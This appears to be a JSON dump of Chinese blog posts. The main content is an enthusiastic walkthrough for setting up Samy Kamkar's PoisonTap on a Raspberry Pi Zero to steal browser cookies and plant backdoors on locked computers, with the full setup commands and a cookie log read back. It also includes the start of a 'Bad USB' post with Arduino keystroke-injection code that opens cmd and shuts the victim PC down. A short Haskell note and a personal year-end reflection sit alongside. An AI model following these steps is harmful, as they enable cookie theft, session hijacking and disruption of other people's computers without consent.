[5]\n\n\n\n\n","slug":"haskell-shou-ji-yi","published":0,"date":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xn500005es5ai1712gn","content":"<p>#安装<br><a href=\"https://www.haskell.org/\" target=\"_blank\" rel=\"external\">https://www.haskell.org/</a><br>不多说。</p>\n<p>#运行</p>\n<blockquote>\n<p>ghci</p>\n</blockquote>\n<p>#代码笔记</p>\n<p>##拼接列表</p>\n<blockquote>\n<p>‘A’ :” SMALL CAT”</p>\n<p>5:[1,2,3]</p>\n<p>[1,2,3] ++ [5]</p>\n</blockquote>\n","excerpt":"","more":"<p>#安装<br><a href=\"https://www.haskell.org/\">https://www.haskell.org/</a><br>不多说。</p>\n<p>#运行</p>\n<blockquote>\n<p>ghci</p>\n</blockquote>\n<p>#代码笔记</p>\n<p>##拼接列表</p>\n<blockquote>\n<p>‘A’ :” SMALL CAT”</p>\n<p>5:[1,2,3]</p>\n<p>[1,2,3] ++ [5]</p>\n</blockquote>\n"},{"title":"30秒内盗取任意PC的Cookie神器 PoisonTap","date":"2016-12-18T18:44:51.000Z","header-img":"/content/images/2016/07/stock-photo-132346157-1.jpg","_content":"\n著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。\n\n是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。\n\n<!--more-->\n\n# 介绍\n\nPoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。\n\n![](/content/images/poisontap/1.gif)\n\n把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：\n\n> 有线网络>无线网络\n\n也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。\n\n没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：\n\n- 模拟成一个伪USB网卡\n- 不需要解锁电脑就可以实现攻击\n- 劫持系统所有网络连接的所有流量 包括局域网\n- 窃取储存Alexa前一百万的网站的Cookie和Session\n- 用远程outbound的方式进行WebSocket或DNS重绑定攻击\n- 用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商\n- 截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标\n\n![](/content/images/poisontap/2.gif)\n\nPoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：\n\n* 锁屏密码\n* 路由表ARP的优先级设置和网络适配器优先级设置\n* 同源策略 (Same-Origin Policy)\n* X-Frame-Options 响应头攻击\n* Cookie的HttpOnly安全设置\n* Cookie的SameSite安全属性\n* 两步/多步验证密码(2FA/MFA)\n* DNS劫持\n* 跨域资源共享CORS\n* HTTPS cookie 保护\n\n# 安装\n\n接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。\n\n注意！配置前请保证`apt-get`命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。\n\n首先，我们在本机下载下来这个神器Poisontap\n\n```bash\ngit clone https://github.com/samyk/poisontap\n```\n然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。\n```bash\nscp -r poisontap pi@zero.local:~\n```\n登录到树莓派上，运行\n```bash\ncd poisontap\necho -e \"\\nauto usb0\\nallow-hotplug usb0\\niface usb0 inet static\\n\\taddress 1.0.0.1\\n\\tnetmask 0.0.0.0\" >> /etc/network/interfaces\necho \"dtoverlay=dwc2\" >> /boot/config.txt\necho -e \"dwc2\\ng_ether\" >> /etc/modules\nsudo sed --in-place \"/exit 0/d\" /etc/rc.local\necho \"/bin/sh /home/pi/poisontap/pi_startup.sh\" >> /etc/rc.local\nmkdir /home/pi/poisontap\nchown -R pi /home/pi/poisontap\napt-get update && apt-get upgrade\napt-get -y install isc-dhcp-server dsniff screen nodejs\n```\n确保以上都成功后，运行\n```bash\nsudo cp dhcpd.conf /etc/dhcp/dhcpd.conf\nreboot\n```\n好了，已经安装好了，接下来我们可以Hack啦~\n# Hack\n## Cookie 和 Session窃取\n把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。\n\n为了使攻击过程可视化，我们访问 www.google.com\n\n![](/content/images/poisontap/4.png)\n\n动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。\n\n![](/content/images/poisontap/5.png)\n\n打开Chrome的工具看一看，哇。\n\n随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。\n\n```bash\ncat poisontap.cookies.log\n```\n\n![](/content/images/poisontap/3.png)\n\n## 伪造网站\n\n\n## 远程后门\n\n\n# 参考\nhttps://github.com/samyk/poisontap\n","source":"_posts/30秒内盗取任意PC的Cookie和Session之神器PoisonTap.md","raw":"---\ntitle: 30秒内盗取任意PC的Cookie神器 PoisonTap\ndate: 2016-12-18 18:44:51\ntags: Hack \ncategories: Hack \npermalink: poisontap\nheader-img: \"/content/images/2016/07/stock-photo-132346157-1.jpg\"\n\n---\n\n著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。\n\n是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。\n\n<!--more-->\n\n# 介绍\n\nPoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。\n\n![](/content/images/poisontap/1.gif)\n\n把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：\n\n> 有线网络>无线网络\n\n也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。\n\n没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：\n\n- 模拟成一个伪USB网卡\n- 不需要解锁电脑就可以实现攻击\n- 劫持系统所有网络连接的所有流量 包括局域网\n- 窃取储存Alexa前一百万的网站的Cookie和Session\n- 用远程outbound的方式进行WebSocket或DNS重绑定攻击\n- 用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商\n- 截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标\n\n![](/content/images/poisontap/2.gif)\n\nPoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：\n\n* 锁屏密码\n* 路由表ARP的优先级设置和网络适配器优先级设置\n* 同源策略 (Same-Origin Policy)\n* X-Frame-Options 响应头攻击\n* Cookie的HttpOnly安全设置\n* Cookie的SameSite安全属性\n* 两步/多步验证密码(2FA/MFA)\n* DNS劫持\n* 跨域资源共享CORS\n* HTTPS cookie 保护\n\n# 安装\n\n接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。\n\n注意！配置前请保证`apt-get`命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。\n\n首先，我们在本机下载下来这个神器Poisontap\n\n```bash\ngit clone https://github.com/samyk/poisontap\n```\n然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。\n```bash\nscp -r poisontap pi@zero.local:~\n```\n登录到树莓派上，运行\n```bash\ncd poisontap\necho -e \"\\nauto usb0\\nallow-hotplug usb0\\niface usb0 inet static\\n\\taddress 1.0.0.1\\n\\tnetmask 0.0.0.0\" >> /etc/network/interfaces\necho \"dtoverlay=dwc2\" >> /boot/config.txt\necho -e \"dwc2\\ng_ether\" >> /etc/modules\nsudo sed --in-place \"/exit 0/d\" /etc/rc.local\necho \"/bin/sh /home/pi/poisontap/pi_startup.sh\" >> /etc/rc.local\nmkdir /home/pi/poisontap\nchown -R pi /home/pi/poisontap\napt-get update && apt-get upgrade\napt-get -y install isc-dhcp-server dsniff screen nodejs\n```\n确保以上都成功后，运行\n```bash\nsudo cp dhcpd.conf /etc/dhcp/dhcpd.conf\nreboot\n```\n好了，已经安装好了，接下来我们可以Hack啦~\n# Hack\n## Cookie 和 Session窃取\n把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。\n\n为了使攻击过程可视化，我们访问 www.google.com\n\n![](/content/images/poisontap/4.png)\n\n动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。\n\n![](/content/images/poisontap/5.png)\n\n打开Chrome的工具看一看，哇。\n\n随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。\n\n```bash\ncat poisontap.cookies.log\n```\n\n![](/content/images/poisontap/3.png)\n\n## 伪造网站\n\n\n## 远程后门\n\n\n# 参考\nhttps://github.com/samyk/poisontap\n","slug":"poisontap","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xna00025es5j95toscr","content":"<p>著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。</p>\n<p>是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。</p>\n<a id=\"more\"></a>\n<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。</p>\n<p><img src=\"/content/images/poisontap/1.gif\" alt=\"\"></p>\n<p>把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：</p>\n<blockquote>\n<p>有线网络&gt;无线网络</p>\n</blockquote>\n<p>也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。</p>\n<p>没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：</p>\n<ul>\n<li>模拟成一个伪USB网卡</li>\n<li>不需要解锁电脑就可以实现攻击</li>\n<li>劫持系统所有网络连接的所有流量 包括局域网</li>\n<li>窃取储存Alexa前一百万的网站的Cookie和Session</li>\n<li>用远程outbound的方式进行WebSocket或DNS重绑定攻击</li>\n<li>用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商</li>\n<li>截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标</li>\n</ul>\n<p><img src=\"/content/images/poisontap/2.gif\" alt=\"\"></p>\n<p>PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：</p>\n<ul>\n<li>锁屏密码</li>\n<li>路由表ARP的优先级设置和网络适配器优先级设置</li>\n<li>同源策略 (Same-Origin Policy)</li>\n<li>X-Frame-Options 响应头攻击</li>\n<li>Cookie的HttpOnly安全设置</li>\n<li>Cookie的SameSite安全属性</li>\n<li>两步/多步验证密码(2FA/MFA)</li>\n<li>DNS劫持</li>\n<li>跨域资源共享CORS</li>\n<li>HTTPS cookie 保护</li>\n</ul>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><p>接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。</p>\n<p>注意！配置前请保证<code>apt-get</code>命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。</p>\n<p>首先，我们在本机下载下来这个神器Poisontap</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/samyk/poisontap</div></pre></td></tr></table></figure>\n<p>然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r poisontap pi@zero.local:~</div></pre></td></tr></table></figure></p>\n<p>登录到树莓派上，运行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> poisontap</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"\\nauto usb0\\nallow-hotplug usb0\\niface usb0 inet static\\n\\taddress 1.0.0.1\\n\\tnetmask 0.0.0.0\"</span> &gt;&gt; /etc/network/interfaces</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"dtoverlay=dwc2\"</span> &gt;&gt; /boot/config.txt</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"dwc2\\ng_ether\"</span> &gt;&gt; /etc/modules</div><div class=\"line\">sudo sed --in-place <span class=\"string\">\"/exit 0/d\"</span> /etc/rc.local</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/bin/sh /home/pi/poisontap/pi_startup.sh\"</span> &gt;&gt; /etc/rc.local</div><div class=\"line\">mkdir /home/pi/poisontap</div><div class=\"line\">chown -R pi /home/pi/poisontap</div><div class=\"line\">apt-get update &amp;&amp; apt-get upgrade</div><div class=\"line\">apt-get -y install isc-dhcp-server dsniff screen nodejs</div></pre></td></tr></table></figure></p>\n<p>确保以上都成功后，运行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp dhcpd.conf /etc/dhcp/dhcpd.conf</div><div class=\"line\">reboot</div></pre></td></tr></table></figure></p>\n<p>好了，已经安装好了，接下来我们可以Hack啦~</p>\n<h1 id=\"Hack\"><a href=\"#Hack\" class=\"headerlink\" title=\"Hack\"></a>Hack</h1><h2 id=\"Cookie-和-Session窃取\"><a href=\"#Cookie-和-Session窃取\" class=\"headerlink\" title=\"Cookie 和 Session窃取\"></a>Cookie 和 Session窃取</h2><p>把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。</p>\n<p>为了使攻击过程可视化，我们访问 www.google.com</p>\n<p><img src=\"/content/images/poisontap/4.png\" alt=\"\"></p>\n<p>动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。</p>\n<p><img src=\"/content/images/poisontap/5.png\" alt=\"\"></p>\n<p>打开Chrome的工具看一看，哇。</p>\n<p>随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">cat poisontap.cookies.log</div></pre></td></tr></table></figure>\n<p><img src=\"/content/images/poisontap/3.png\" alt=\"\"></p>\n<h2 id=\"伪造网站\"><a href=\"#伪造网站\" class=\"headerlink\" title=\"伪造网站\"></a>伪造网站</h2><h2 id=\"远程后门\"><a href=\"#远程后门\" class=\"headerlink\" title=\"远程后门\"></a>远程后门</h2><h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://github.com/samyk/poisontap\" target=\"_blank\" rel=\"external\">https://github.com/samyk/poisontap</a></p>\n","excerpt":"<p>著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。</p>\n<p>是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。</p>","more":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。</p>\n<p><img src=\"/content/images/poisontap/1.gif\" alt=\"\"></p>\n<p>把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：</p>\n<blockquote>\n<p>有线网络&gt;无线网络</p>\n</blockquote>\n<p>也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。</p>\n<p>没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：</p>\n<ul>\n<li>模拟成一个伪USB网卡</li>\n<li>不需要解锁电脑就可以实现攻击</li>\n<li>劫持系统所有网络连接的所有流量 包括局域网</li>\n<li>窃取储存Alexa前一百万的网站的Cookie和Session</li>\n<li>用远程outbound的方式进行WebSocket或DNS重绑定攻击</li>\n<li>用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商</li>\n<li>截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标</li>\n</ul>\n<p><img src=\"/content/images/poisontap/2.gif\" alt=\"\"></p>\n<p>PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：</p>\n<ul>\n<li>锁屏密码</li>\n<li>路由表ARP的优先级设置和网络适配器优先级设置</li>\n<li>同源策略 (Same-Origin Policy)</li>\n<li>X-Frame-Options 响应头攻击</li>\n<li>Cookie的HttpOnly安全设置</li>\n<li>Cookie的SameSite安全属性</li>\n<li>两步/多步验证密码(2FA/MFA)</li>\n<li>DNS劫持</li>\n<li>跨域资源共享CORS</li>\n<li>HTTPS cookie 保护</li>\n</ul>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><p>接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。</p>\n<p>注意！配置前请保证<code>apt-get</code>命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。</p>\n<p>首先，我们在本机下载下来这个神器Poisontap</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/samyk/poisontap</div></pre></td></tr></table></figure>\n<p>然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r poisontap pi@zero.local:~</div></pre></td></tr></table></figure></p>\n<p>登录到树莓派上，运行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> poisontap</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"\\nauto usb0\\nallow-hotplug usb0\\niface usb0 inet static\\n\\taddress 1.0.0.1\\n\\tnetmask 0.0.0.0\"</span> &gt;&gt; /etc/network/interfaces</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"dtoverlay=dwc2\"</span> &gt;&gt; /boot/config.txt</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"dwc2\\ng_ether\"</span> &gt;&gt; /etc/modules</div><div class=\"line\">sudo sed --in-place <span class=\"string\">\"/exit 0/d\"</span> /etc/rc.local</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/bin/sh /home/pi/poisontap/pi_startup.sh\"</span> &gt;&gt; /etc/rc.local</div><div class=\"line\">mkdir /home/pi/poisontap</div><div class=\"line\">chown -R pi /home/pi/poisontap</div><div class=\"line\">apt-get update &amp;&amp; apt-get upgrade</div><div class=\"line\">apt-get -y install isc-dhcp-server dsniff screen nodejs</div></pre></td></tr></table></figure></p>\n<p>确保以上都成功后，运行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp dhcpd.conf /etc/dhcp/dhcpd.conf</div><div class=\"line\">reboot</div></pre></td></tr></table></figure></p>\n<p>好了，已经安装好了，接下来我们可以Hack啦~</p>\n<h1 id=\"Hack\"><a href=\"#Hack\" class=\"headerlink\" title=\"Hack\"></a>Hack</h1><h2 id=\"Cookie-和-Session窃取\"><a href=\"#Cookie-和-Session窃取\" class=\"headerlink\" title=\"Cookie 和 Session窃取\"></a>Cookie 和 Session窃取</h2><p>把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。</p>\n<p>为了使攻击过程可视化，我们访问 www.google.com</p>\n<p><img src=\"/content/images/poisontap/4.png\" alt=\"\"></p>\n<p>动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。</p>\n<p><img src=\"/content/images/poisontap/5.png\" alt=\"\"></p>\n<p>打开Chrome的工具看一看，哇。</p>\n<p>随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">cat poisontap.cookies.log</div></pre></td></tr></table></figure>\n<p><img src=\"/content/images/poisontap/3.png\" alt=\"\"></p>\n<h2 id=\"伪造网站\"><a href=\"#伪造网站\" class=\"headerlink\" title=\"伪造网站\"></a>伪造网站</h2><h2 id=\"远程后门\"><a href=\"#远程后门\" class=\"headerlink\" title=\"远程后门\"></a>远程后门</h2><h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://github.com/samyk/poisontap\">https://github.com/samyk/poisontap</a></p>"},{"title":"2016，2017","date":"2016-12-31T14:51:23.000Z","header-img":"/content/images/2017/2017.jpg","_content":"\n似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。\n\n每年这个时候，都会自觉地打开cnbeta.com看每一年的[新年祝福](http://www.cnbeta.com/articles/572451.htm)。今年，也不例外，这么一看，已经9年过去了。\n\n# 2016\n\n在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。\n\n截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。\n\nGithub获得Star总数88个，607次代码贡献次数，702个粉丝。\n\n同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。\n\n在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。\n\n\n# 2017\n\n2017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？\n\n\n我不去想，\n\n是否能够成功 ，\n\n既然选择了远方 ，\n\n便只顾风雨兼程。\n\n\n  \n","source":"_posts/2016，2017.md","raw":"---\ntitle: 2016，2017\ndate: 2016-12-31 14:51:23\npermalink: 2017\ntags: 心情\ncategories: 心情\nheader-img: \"/content/images/2017/2017.jpg\"\n\n---\n\n似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。\n\n每年这个时候，都会自觉地打开cnbeta.com看每一年的[新年祝福](http://www.cnbeta.com/articles/572451.htm)。今年，也不例外，这么一看，已经9年过去了。\n\n# 2016\n\n在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。\n\n截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。\n\nGithub获得Star总数88个，607次代码贡献次数，702个粉丝。\n\n同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。\n\n在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。\n\n\n# 2017\n\n2017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？\n\n\n我不去想，\n\n是否能够成功 ，\n\n既然选择了远方 ，\n\n便只顾风雨兼程。\n\n\n  \n","slug":"2017","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnd00045es5bo8fsan5","content":"<p>似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。</p>\n<p>每年这个时候，都会自觉地打开cnbeta.com看每一年的<a href=\"http://www.cnbeta.com/articles/572451.htm\" target=\"_blank\" rel=\"external\">新年祝福</a>。今年，也不例外，这么一看，已经9年过去了。</p>\n<h1 id=\"2016\"><a href=\"#2016\" class=\"headerlink\" title=\"2016\"></a>2016</h1><p>在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。</p>\n<p>截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。</p>\n<p>Github获得Star总数88个，607次代码贡献次数，702个粉丝。</p>\n<p>同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。</p>\n<p>在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。</p>\n<h1 id=\"2017\"><a href=\"#2017\" class=\"headerlink\" title=\"2017\"></a>2017</h1><p>2017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？</p>\n<p>我不去想，</p>\n<p>是否能够成功 ，</p>\n<p>既然选择了远方 ，</p>\n<p>便只顾风雨兼程。</p>\n","excerpt":"","more":"<p>似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。</p>\n<p>每年这个时候，都会自觉地打开cnbeta.com看每一年的<a href=\"http://www.cnbeta.com/articles/572451.htm\">新年祝福</a>。今年，也不例外，这么一看，已经9年过去了。</p>\n<h1 id=\"2016\"><a href=\"#2016\" class=\"headerlink\" title=\"2016\"></a>2016</h1><p>在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。</p>\n<p>截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。</p>\n<p>Github获得Star总数88个，607次代码贡献次数，702个粉丝。</p>\n<p>同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。</p>\n<p>在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。</p>\n<h1 id=\"2017\"><a href=\"#2017\" class=\"headerlink\" title=\"2017\"></a>2017</h1><p>2017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？</p>\n<p>我不去想，</p>\n<p>是否能够成功 ，</p>\n<p>既然选择了远方 ，</p>\n<p>便只顾风雨兼程。</p>\n"},{"title":"Arduino Leonardo 打造 Bad USB","date":"2016-11-27T02:48:23.000Z","_content":"\n嘿嘿嘿，又是一篇猥琐小文。\n\n<!--more -->\n\n# 简介\n\n什么是Bad USB？\n\n![](/content/images/badusb/0.jpg)\n\nBadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。\n\n简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。\n\n# 目标\n\n打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。\n\n![](/content/images/badusb/1.jpg)\n\n\n# 原料\n1. Arduino Leonardo\n2. 普通安卓USB线\n\n# 举个🌰\n\n比如我们要实现一个插入优盘就让对方电脑关机的功能：\n\n用Arduino开发者工具，选择\n\n![](/content/images/badusb/2.jpg)\n\nArduino Leonardo\n\n然后把程序烧录进去\n\n```C\n#include <Keyboard.h>\n\nvoid setup() {//初始化\n   Keyboard.begin();//开始键盘通讯 \n  delay(5000);//延时\n  Keyboard.press(KEY_LEFT_GUI);//win键 \n  delay(500); \n  Keyboard.press('r');//r键 \n  delay(500); \n  Keyboard.release(KEY_LEFT_GUI);\n  Keyboard.release('r');\n  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法\n  Keyboard.release(KEY_CAPS_LOCK);\n  delay(500); \n  Keyboard.println(\"CMD\");\n  delay(500); \n  Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  delay(3000); \n  Keyboard.println(\"shutdown -s -t 10\");\n  Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  Keyboard.press(KEY_CAPS_LOCK);\n  Keyboard.release(KEY_CAPS_LOCK);\n  Keyboard.end();//结束键盘通讯 \n}\nvoid loop()//循环\n{\n   Keyboard.begin();//开始键盘通讯 \n  delay(5000);//延时\n  Keyboard.press(KEY_LEFT_GUI);//win键 \n  delay(500); \n  Keyboard.press('r');//r键 \n  delay(500); \n  Keyboard.release(KEY_LEFT_GUI);\n  Keyboard.release('r');\n  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法\n  Keyboard.release(KEY_CAPS_LOCK);\n  delay(500); \n  Keyboard.println(\"CMD\");\n  delay(500); \n  